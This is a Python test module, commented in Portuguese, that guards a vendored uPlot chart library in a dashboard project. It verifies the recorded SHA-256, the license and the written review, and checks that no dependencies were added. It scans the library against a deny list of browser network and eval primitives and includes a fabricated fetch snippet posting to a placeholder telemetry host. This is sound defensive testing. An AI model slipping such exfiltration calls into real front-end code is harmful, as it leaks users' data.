"""VEND-1..3 — o firewall do arquivo de terceiro vendorizado do dashboard.

Este projeto passou quatro fases sem uma unica linha de codigo de terceiro na
arvore alem das distribuicoes do `requirements.txt`. O dashboard quebra isso:
`l2scanner/recursos/dashboard/vendor/` guarda uma biblioteca de grafico
minificada, que **executa no navegador do usuario**, na mesma maquina em que o
jogo roda e na mesma arvore em que mora o `.env` com o token do Chatwoot.

O `01-UI-SPEC.md`, secao `Registry Safety`, nao deixa isso entrar por confianca.
Ele converte o portao em quatro provas separadas e individualmente verificaveis
— e diz por extenso que **incompletas no momento do merge sao BLOCK**:

    VEND-1  proveniencia conferivel   -> `vendor/README.md`, e este modulo
    VEND-2  revisao do fonte escrita  -> `vendor/README.md`, e este modulo
    VEND-3  um teste que QUEBRA       -> este modulo
    VEND-4  a CSP no cabecalho        -> `l2scanner/dashboard.py`

**Por que o hash e a prova de VEND-1, e nao a URL.** Uma linha de README dizendo
"baixado de tal lugar" e declaratoria: ninguem consegue apontar onde ela falhou.
O SHA-256 recalculado sobre o arquivo em disco e conferivel — uma troca
silenciosa do `.min.js` (T-01-14) muda o byte, muda o hash, e derruba a suite.
"""

from __future__ import annotations

import hashlib
from pathlib import Path

RAIZ = Path(__file__).resolve().parent.parent
VENDOR = RAIZ / "l2scanner" / "recursos" / "dashboard" / "vendor"
README = VENDOR / "README.md"

# Onde a regra mora. A mensagem de falha aponta para ca.
DOCUMENTO_DA_REGRA = (
    ".planning/workstreams/dashboard/phases/"
    "01-dashboard-do-cambio-ao-vivo/01-UI-SPEC.md"
)

# As licencas que o UI-SPEC aceita para um artefato vendorizado. Copyleft foi
# RECUSADO por aquele documento, e por isso a lista e de tres itens e nao "as
# permissivas em geral": uma lista fechada e o que permite um teste dizer nao.
LICENCAS_PERMISSIVAS = {"MIT", "Apache-2.0", "ISC"}

# A BANLIST, ampla e nomeada de proposito.
#
# Sao as primitivas de rede e de execucao dinamica que o VEND-2 manda procurar,
# mais as formas vizinhas que um minificador produz. A largura e deliberada:
# quem procurar uma forma de "so buscar uma coisinha" vai encontrar uma destas,
# e listar onze strings hoje custa menos que descobrir a decima segunda rodando
# no navegador do usuario.
#
# Uma biblioteca de GRAFICO nao precisa de nenhuma delas. Ela recebe um array
# de numeros e desenha; nada nesse trabalho pede rede, e nada pede montar
# codigo a partir de string.
#
# LIMITE HONESTO, dito aqui e nao escondido: esta e uma varredura LITERAL. Ela
# nao ve `window["fet"+"ch"]` nem um nome ofuscado. Isso nao e descuido — e a
# razao de existirem TRES camadas: a leitura humana (VEND-2) pega a intencao de
# hoje, este teste pega a proxima versao automaticamente, e a CSP (VEND-4) pega
# a chamada em EXECUCAO, inclusive a ofuscada que as duas primeiras nao veem.
PRIMITIVAS = (
    "fetch(",
    "XMLHttpRequest",
    "navigator.sendBeacon",
    "sendBeacon",
    "eval(",
    "new Function",
    "Function(",
    "import(",
    "createElement('script'",
    'createElement("script"',
    "WebSocket",
)

# O ALCANCE da varredura, e o ponto em que este modulo pode se auto-anular.
#
# So arquivos de CODIGO e de ESTILO entram. O `README.md` fica de fora POR
# CONSTRUCAO — e nao por descuido — porque o VEND-2 EXIGE que ele cite as
# primitivas pelo nome na nota de revisao. Uma varredura ingenua sobre o
# diretorio inteiro acusaria o proprio documento que a regra manda escrever, e
# o conserto obvio (afrouxar a varredura) mataria o guarda.
#
# `uPlot.LICENSE` e `.gitattributes` tambem ficam de fora: nao sao executaveis,
# e o texto de uma licenca MIT nao roda no navegador de ninguem.
EXTENSOES_DE_CODIGO = (".js", ".mjs", ".cjs", ".css", ".ts")


def _arquivos_de_codigo_do_vendor() -> list[Path]:
    """Os arquivos vendorizados que EXECUTAM. Ver `EXTENSOES_DE_CODIGO`."""
    if not VENDOR.is_dir():
        return []
    return sorted(
        caminho
        for caminho in VENDOR.iterdir()
        if caminho.is_file() and caminho.suffix in EXTENSOES_DE_CODIGO
    )


def _sha256(caminho: Path) -> str:
    return hashlib.sha256(caminho.read_bytes()).hexdigest()


def _secao_de_revisao() -> str:
    """So a secao de revisao do README, e nao o arquivo inteiro.

    Recortar importa: o arquivo inteiro tambem cita as primitivas na secao de
    manutencao, e um teste que aceitasse qualquer mencao em qualquer lugar
    deixaria de exigir que a REVISAO existisse.
    """
    texto = README.read_text(encoding="utf-8")
    inicio = texto.index("## Revisao do fonte")
    resto = texto[inicio + 1 :]
    fim = resto.find("\n## ")
    return resto if fim == -1 else resto[:fim]


# ---------------------------------------------------------------------------
# VEND-1 — a proveniencia e CONFERIVEL, e nao declaratoria
# ---------------------------------------------------------------------------


def test_o_sha256_do_README_bate_com_o_arquivo_EM_DISCO() -> None:
    """A unica assercao que torna VEND-1 conferivel em vez de declaratoria.

    O hash e calculado AQUI, sobre os bytes que estao no disco desta arvore, e
    exigido dentro do README. Nao ha como passar copiando um valor de documento
    de pesquisa: se o arquivo em disco for outro, o hash calculado e outro e a
    string nao aparece.

    E o guarda de T-01-14 (troca silenciosa do arquivo vendorizado): quem
    substituir o `.min.js` por uma versao com telemetria tem de tambem editar
    este README, e ai a substituicao deixa rastro no diff.
    """
    arquivos = _arquivos_de_codigo_do_vendor()
    # Sem esta linha, uma pasta vazia deixaria o laco abaixo verde por vacuidade
    # — o modo de falha mais caro que um controle destes tem. O teste dedicado a
    # isso esta em `test_a_varredura_enumerou_ao_menos_UM_arquivo`.
    assert arquivos, f"{VENDOR} nao tem arquivo de codigo nenhum"

    texto = README.read_text(encoding="utf-8")
    for arquivo in arquivos:
        digest = _sha256(arquivo)
        assert digest in texto, (
            f"O SHA-256 de {arquivo.name} NAO esta registrado em "
            f"{README.relative_to(RAIZ)}.\n"
            f"\n"
            f"Calculado agora, sobre os bytes em disco: {digest}\n"
            f"\n"
            f"Ou o arquivo vendorizado foi trocado sem que a proveniencia "
            f"fosse atualizada — que e exatamente a troca silenciosa que o "
            f"VEND-1 existe para tornar visivel — ou o README foi escrito com "
            f"o hash de outra origem em vez do recalculado.\n"
            f"\n"
            f"Ver a secao `Registry Safety` de {DOCUMENTO_DA_REGRA}."
        )


def test_o_README_nomeia_a_versao_e_uma_licenca_PERMISSIVA() -> None:
    """Versao exata e licenca sao campos do VEND-1, e a licenca e fechada.

    "MIT" nao esta aqui por gosto: o UI-SPEC recusa copyleft por escrito. Uma
    atualizacao futura que trocasse a biblioteca por uma GPL passaria batida se
    este teste aceitasse "qualquer licenca declarada".
    """
    texto = README.read_text(encoding="utf-8")
    assert "1.6.32" in texto, "o README nao nomeia a versao exata da biblioteca"

    declaradas = {nome for nome in LICENCAS_PERMISSIVAS if nome in texto}
    assert declaradas, (
        f"O README nao declara nenhuma das licencas que o UI-SPEC aceita "
        f"({', '.join(sorted(LICENCAS_PERMISSIVAS))}). Copyleft foi RECUSADO "
        f"por aquele documento — ver {DOCUMENTO_DA_REGRA}."
    )
    assert "MIT" in declaradas


def test_o_texto_da_licenca_esta_na_arvore_e_NAO_esta_vazio() -> None:
    """A licenca acompanha o codigo, que e a obrigacao que a MIT impoe.

    Um arquivo de licenca vazio (ou um download que falhou devolvendo 0 byte)
    satisfaria "o arquivo existe" e nao satisfaria nada do que a licenca pede.
    """
    licenca = VENDOR / "uPlot.LICENSE"
    assert licenca.is_file(), f"{licenca} nao existe"
    texto = licenca.read_text(encoding="utf-8")
    assert "Copyright" in texto, "o texto da licenca nao traz aviso de copyright"
    assert "MIT" in texto


def test_o_README_registra_a_proveniencia_BYTES_URL_e_DATA() -> None:
    """Os campos restantes do VEND-1, conferidos contra o disco.

    O tamanho em bytes e o campo que se confere A OLHO: um hash diferente diz
    "mudou", um tamanho de 197 KB onde deveria haver 51 KB diz O QUE mudou.
    """
    texto = README.read_text(encoding="utf-8")
    for arquivo in (*_arquivos_de_codigo_do_vendor(), VENDOR / "uPlot.LICENSE"):
        tamanho = str(arquivo.stat().st_size)
        assert tamanho in texto, (
            f"O README nao registra o tamanho de {arquivo.name} "
            f"({tamanho} bytes em disco agora)."
        )
        assert arquivo.name in texto, f"o README nao nomeia {arquivo.name}"

    assert "https://cdn.jsdelivr.net/npm/uplot@1.6.32/" in texto, (
        "o README nao registra a URL de origem — sem ela nao ha como refazer "
        "o download e reconferir o hash (VEND-1, campo de proveniencia)"
    )
    assert "2026-09-01" in texto, "o README nao registra a data do download"


# ---------------------------------------------------------------------------
# VEND-2 — a revisao do fonte foi FEITA, e esta escrita
# ---------------------------------------------------------------------------


def test_o_README_registra_a_revisao_de_TODAS_as_primitivas() -> None:
    """A nota de revisao acompanha a banlist deste modulo, item a item.

    Este e o teste que impede o modo de falha mais silencioso do VEND-2: alguem
    acrescenta uma primitiva a `PRIMITIVAS` (porque descobriu uma forma nova de
    puxar rede), a varredura passa a procura-la, e ninguem volta ao README para
    dizer se ela foi encontrada. O documento ficaria descrevendo uma revisao
    menor do que a que o codigo faz — e o VEND-2 pede a revisao ESCRITA, nao a
    varredura automatica, que e o VEND-3.

    A assercao e derivada de `PRIMITIVAS` de proposito: uma lista repetida a
    mao aqui concordaria com o README para sempre, sem nunca cobrar nada.
    """
    secao = _secao_de_revisao()
    faltando = [primitiva for primitiva in PRIMITIVAS if primitiva not in secao]
    assert not faltando, (
        f"A secao de revisao de {README.relative_to(RAIZ)} nao menciona: "
        f"{faltando}.\n"
        f"\n"
        f"A varredura deste modulo procura essas primitivas, e o VEND-2 exige "
        f"a contagem POR PRIMITIVA registrada por escrito. Quem acrescentou a "
        f"lista precisa voltar ao README, rodar a varredura de novo e anotar o "
        f"resultado — inclusive se for zero.\n"
        f"\n"
        f"Ver a secao `Registry Safety` de {DOCUMENTO_DA_REGRA}."
    )


def test_a_revisao_registra_o_VEREDITO_e_nao_so_a_tabela() -> None:
    """Uma tabela de zeros sem veredito nao e uma revisao — e uma planilha.

    O VEND-2 tem dois desfechos possiveis e o README tem de dizer qual
    aconteceu: aprovado por zero ocorrencias, ou reprovado com `arquivo:linha`
    e a decisao humana registrada.
    """
    secao = _secao_de_revisao()
    assert "Veredito VEND-2" in secao, "a secao de revisao nao declara veredito"
    assert "aprovado" in secao.lower()


def test_a_revisao_registra_a_REFUTACAO_do_zoom_por_roda() -> None:
    """A suposicao do UI-SPEC que caiu, com a MEDICAO e nao so a conclusao.

    O UI-SPEC afirma que "toda biblioteca dessa classe faz [zoom e pan] com
    config". Medido: falso para a escolhida. O que este teste cobra e a lista
    dos eventos que a biblioteca DE FATO registra — porque "nao tem wheel" e
    uma conclusao, e a lista e a evidencia. Sem a evidencia ao lado, a proxima
    pessoa que atualizar a versao nao tem como saber se a frase ainda vale.

    O contrafactual esta preso na segunda metade: o `.min.js` em disco nao pode
    ter ganhado um listener de roda sem que este documento mudasse junto.
    """
    secao = _secao_de_revisao()
    assert "wheel" in secao, "a refutacao do zoom por roda nao esta registrada"
    for evento in ("mousedown", "mouseup", "dblclick", "resize"):
        assert evento in secao, (
            f"a secao nao lista o evento `{evento}`, que a biblioteca de fato "
            f"registra — sem a lista, sobra a conclusao sem a medicao"
        )

    codigo = (VENDOR / "uPlot.iife.min.js").read_text(encoding="utf-8")
    assert "wheel" not in codigo, (
        "a biblioteca vendorizada PASSOU a registrar `wheel`. A secao de "
        "revisao do README diz o contrario, e o plano 01-07 escreve o zoom por "
        "roda a mao por causa dessa ausencia. Reconferir os dois."
    )


# ---------------------------------------------------------------------------
# VEND-3 — o teste que QUEBRA
# ---------------------------------------------------------------------------
#
# A DOUTRINA DA CASA, e por que ela e repetida aqui
# =================================================
# A verificacao da Fase 4 contou OITO instancias do mesmo padrao de defeito
# nesta arvore: um guarda cuja saida nao muda com o fato que ele julga. O
# antidoto e sempre o mesmo, e esta escrito em
# `tests/test_mercado_firewall_de_fase.py:449-470`:
#
#     ao lado da afirmacao, o CONTROLE NEGATIVO que prova que o guarda reprova
#     quando o fato acontece.
#
# Este modulo e especialmente exposto a esse defeito, por dois caminhos:
#
#   1. VACUIDADE. Uma varredura sobre uma pasta `vendor/` vazia — ou sobre um
#      filtro de extensao que deixou de casar — fica VERDE para sempre. Zero
#      arquivos examinados produz zero ocorrencias encontradas, que e
#      exatamente o que o teste quer ver.
#   2. AUTO-ANULACAO. O `README.md` desta pasta CITA todas as primitivas pelo
#      nome, porque o VEND-2 manda registrar a contagem por primitiva. Uma
#      varredura ingenua sobre o diretorio inteiro acusaria o proprio documento
#      que a regra manda escrever — e o conserto obvio (afrouxar a varredura,
#      ou tirar as primitivas do README) mataria uma das duas provas.
#
# Os tres guardas abaixo fecham os dois caminhos, e o controle negativo prova
# que o detector acusa sem que nada precise de fato entrar na arvore.


def _primitivas_presentes(texto: str) -> set[str]:
    """O UNICO ponto de decisao do modulo — e por isso o alvo da mutacao.

    Manter a decisao numa funcao pura, que recebe TEXTO e nao um caminho, e o
    que permite provar que o detector acusa sem baixar nada de verdade e sem
    escrever um arquivo malicioso na arvore. A mutacao acontece na ENTRADA da
    funcao, nunca no disco.

    Busca literal, de proposito: ver a nota de limite em `PRIMITIVAS`.
    """
    return {primitiva for primitiva in PRIMITIVAS if primitiva in texto}


def _mensagem(encontradas: set[str], arquivo: str) -> str:
    return (
        f"PRIMITIVA DE REDE NO ARQUIVO VENDORIZADO: "
        f"{', '.join(sorted(encontradas))} (encontrada em {arquivo}).\n"
        f"\n"
        f"Este arquivo e de TERCEIRO e executa no NAVEGADOR DO USUARIO, na "
        f"mesma maquina em que o jogo roda e na mesma arvore em que mora o "
        f"`.env` com o token do Chatwoot. Uma biblioteca de grafico recebe um "
        f"array de numeros e desenha: ela nao precisa de nenhuma dessas "
        f"primitivas para fazer o trabalho dela.\n"
        f"\n"
        f"O VEND-2 diz que qualquer ocorrencia exige REVISAO HUMANA EXPLICITA "
        f"E REGISTRADA antes de seguir. A CSP do VEND-4 conteria o estrago no "
        f"navegador, mas o portao e sobre o FONTE, e nao sobre a contencao — e "
        f"o navegador barra em silencio, sem contar a ninguem daqui.\n"
        f"\n"
        f"Se a primitiva chegou junto com uma atualizacao de versao: pare, "
        f"leia o contexto dela no minificado, e leve a decisao ao usuario com "
        f"`arquivo:linha`. Registre o resultado em "
        f"`l2scanner/recursos/dashboard/vendor/README.md`.\n"
        f"\n"
        f"Ver a secao `Registry Safety` de {DOCUMENTO_DA_REGRA}."
    )


def test_nenhum_arquivo_vendorizado_TRAZ_primitiva_de_rede() -> None:
    """A varredura, sobre os arquivos em disco. VEND-3.

    Esta e a afirmacao. Ela sozinha nao vale nada — o que a torna um guarda sao
    os tres testes abaixo: o controle negativo, o guarda de alcance e o guarda
    contra vacuidade.
    """
    for arquivo in _arquivos_de_codigo_do_vendor():
        texto = arquivo.read_text(encoding="utf-8", errors="replace")
        encontradas = _primitivas_presentes(texto)
        assert not encontradas, _mensagem(
            encontradas, str(arquivo.relative_to(RAIZ))
        )


def test_o_detector_ACUSA_uma_primitiva_de_rede_injetada() -> None:
    """O CONTROLE NEGATIVO — a prova do vermelho SEM baixar nada.

    Sem este teste, um bug no filtro de extensao, uma `PRIMITIVAS` esvaziada
    numa refatoracao, ou simplesmente uma pasta `vendor/` vazia deixariam a
    varredura acima verde PARA SEMPRE, e o firewall viraria teatro de controle
    — a nona instancia do padrao de defeito que esta arvore ja nomeou oito
    vezes.

    O trecho e FABRICADO aqui dentro, na entrada da funcao pura. Nada e escrito
    no disco: cometer o proprio pecado que o teste existe para impedir seria
    uma forma cara de se enganar.
    """
    fabricado = (
        "!function(){var d=document.createElement('div');"
        "fetch('https://telemetria.exemplo/coleta',{method:'POST'});}();"
    )
    assert _primitivas_presentes(fabricado) == {"fetch("}

    # E o trecho inocente NAO pode virar falso positivo: um guarda que acusa a
    # esmo e desligado na primeira semana, e ai nao guarda mais nada.
    inocente = (
        "!function(){var u=new uPlot(opts,data,root);"
        "u.setScale('x',{min:0,max:100});}();"
    )
    assert _primitivas_presentes(inocente) == set()

    # As outras formas tambem acusam — a banlist e ampla justamente porque
    # `fetch(` nao e a unica porta.
    assert _primitivas_presentes("var t=new XMLHttpRequest();") == {
        "XMLHttpRequest"
    }
    assert _primitivas_presentes("navigator.sendBeacon('/x',d)") == {
        "navigator.sendBeacon",
        "sendBeacon",
    }
    assert _primitivas_presentes("var f=new Function('a','return a')") == {
        "new Function",
        "Function(",
    }
    assert _primitivas_presentes("new WebSocket('wss://x')") == {"WebSocket"}


def test_a_varredura_NAO_alcanca_o_README_que_CITA_as_primitivas() -> None:
    """O GUARDA DE ALCANCE — onde este modulo poderia se auto-anular.

    O `README.md` cita todas as primitivas pelo nome, porque o VEND-2 EXIGE a
    contagem por primitiva registrada por escrito. Se a varredura enxergasse o
    diretorio inteiro, ela acusaria o proprio documento que a regra manda
    escrever — e o conserto que qualquer um faria (tirar as primitivas do
    README, ou afrouxar a varredura) destruiria uma das duas provas.

    A segunda metade e o que torna este teste um guarda e nao uma decoracao:
    ela prova que o filtro e LOAD-BEARING, mostrando que o README de fato
    dispararia o detector se estivesse ao alcance dele.
    """
    varridos = {arquivo.name for arquivo in _arquivos_de_codigo_do_vendor()}

    assert "uPlot.iife.min.js" in varridos, (
        "o arquivo de codigo vendorizado saiu do alcance da varredura — o "
        "filtro de extensao deixou de casar, e o firewall ficou vazio"
    )
    assert "README.md" not in varridos
    assert "uPlot.LICENSE" not in varridos
    assert ".gitattributes" not in varridos

    # A prova de que o filtro esta segurando alguma coisa de verdade.
    no_readme = _primitivas_presentes(README.read_text(encoding="utf-8"))
    assert len(no_readme) >= 5, (
        "o README deixou de citar as primitivas, e com isso este guarda de "
        "alcance deixou de guardar qualquer coisa. Ou a nota de revisao do "
        "VEND-2 sumiu (o que ja e um problema), ou ela virou vaga demais."
    )


def test_a_varredura_enumerou_ao_menos_UM_arquivo() -> None:
    """O GUARDA CONTRA VACUIDADE — uma pasta vazia tem de FALHAR.

    Zero arquivos examinados produz zero ocorrencias encontradas, que e
    exatamente o que `test_nenhum_arquivo_vendorizado_TRAZ_primitiva_de_rede`
    quer ver. Uma pasta `vendor/` apagada, um `.gitignore` engolindo os
    artefatos, ou um caminho errado em `VENDOR` deixariam a suite verde sobre
    uma arvore sem firewall nenhum.
    """
    arquivos = _arquivos_de_codigo_do_vendor()
    assert arquivos, (
        f"{VENDOR.relative_to(RAIZ)} nao tem nenhum arquivo de codigo. A "
        f"varredura do VEND-3 passaria por VACUIDADE — nao porque a biblioteca "
        f"esta limpa, mas porque nao ha o que ler."
    )
    assert len(arquivos) >= 2, (
        "uPlot precisa de DOIS arquivos (codigo e folha de estilo); um deles "
        "sumiu, e a pagina ou o guarda estao incompletos"
    )


# ---------------------------------------------------------------------------
# NENHUMA DEPENDENCIA NOVA
# ---------------------------------------------------------------------------
#
# As onze distribuicoes que o projeto declarava ANTES desta fase. A lista esta
# escrita A MAO de proposito, no molde de
# `tests/test_mercado_firewall_de_fase.py:400-403`: deriva-la do proprio
# `requirements.txt` faria o teste concordar com qualquer coisa que alguem
# acrescentasse.
#
# A biblioteca de grafico vendorizada NAO entra nesta lista, e a distincao e o
# ponto: ela e um ATIVO ESTATICO servido ao navegador, e nao uma dependencia do
# interpretador Python. Nenhum `pip install` a traz, nenhum `import` a alcanca,
# e o `vigiar-party.bat` nao muda por causa dela. Foi justamente por isso que a
# escolha da biblioteca pesou BYTES VENDORIZADOS, e nao peso de wheel.
DISTRIBUICOES_ANTES_DA_FASE_01_DASHBOARD = {
    "mss",
    "opencv-python",
    "numpy",
    "windows-capture",
    "winrt-windows-media-ocr",
    "winrt-windows-graphics-imaging",
    "winrt-windows-storage-streams",
    "winrt-windows-globalization",
    "winrt-windows-foundation",
    "winrt-windows-foundation-collections",
    "discord-py",
}


class TestNenhumaDependenciaNova:
    """O `requirements.txt` nao ganhou linha nesta fase, e ha teste prendendo.

    O extrator de nome de distribuicao e IMPORTADO de `test_firewall_escopo`, e
    nao reescrito: um segundo extrator com um `_FIM_DO_NOME` ligeiramente
    diferente seria a forma mais silenciosa de os dois firewalls discordarem
    sobre o que e um nome de pacote.
    """

    def test_o_requirements_nao_ganhou_linha_nesta_fase(self) -> None:
        from tests.test_firewall_escopo import _nomes_declarados_no_requirements

        texto = (RAIZ / "requirements.txt").read_text(encoding="utf-8")
        assert (
            _nomes_declarados_no_requirements(texto)
            == DISTRIBUICOES_ANTES_DA_FASE_01_DASHBOARD
        )

    def test_o_guarda_REPROVA_quando_uma_linha_NOVA_e_declarada(self) -> None:
        """O controle negativo do guarda acima.

        A mutacao acontece no TEXTO entregue ao extrator, e nao no
        `requirements.txt` do disco — acrescentar uma dependencia de verdade
        dentro de um teste seria cometer o que o teste existe para impedir.

        Sem esta metade, um bug no extrator (ou um recorte de comentario que
        engolisse linhas demais) faria a igualdade acima passar sobre uma
        arvore em que a dependencia nova ESTAVA declarada.
        """
        from tests.test_firewall_escopo import _nomes_declarados_no_requirements

        texto = (RAIZ / "requirements.txt").read_text(encoding="utf-8")
        adulterado = texto + "\nplotly>=6.0\n"
        nomes = _nomes_declarados_no_requirements(adulterado)
        assert nomes != DISTRIBUICOES_ANTES_DA_FASE_01_DASHBOARD
        assert "plotly" in nomes
